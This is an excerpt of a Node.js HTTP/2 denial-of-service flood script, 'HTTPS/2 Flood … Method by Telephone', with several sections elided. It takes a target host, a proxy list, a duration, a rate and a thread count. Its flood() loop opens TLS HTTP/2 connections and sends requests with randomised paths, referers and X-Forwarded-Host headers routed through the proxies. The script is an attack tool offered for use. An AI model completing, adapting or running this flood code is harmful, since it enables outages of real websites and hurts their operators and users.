...
if (process.argv.length < 8){
	console.log('	');
    console.log('		HTTPS/2 Flood (HTTPS Only) | Method by Telephone '.green.bold);
	console.log('	');
    console.log('Usage: node te-tls.js <GET/HEAD> <host> <proxies> <duration> <rate < 64> <thread < 2>	');
...
const dateObj = new Date();
	...
	console.log('	Attacking | Made By Telephone');
    setTimeout(() => {
    ...
    function flood() {
        ...
        var header = {
			...
			":scheme": "https",
		    "Referer": refer(),
            ":path": parsed.path + patht[Math.floor(Math.random() * patht.length)] + randstr(15) + '+' + randstr(15), 
            ...
            const client = http2.connect(parsed.href, {
                createConnection: () => tls.connect({
                    ...
                    for (let i = 0; i< rate; i++){
						...
						header["X-Forwarded-Host"] = proxy[0];
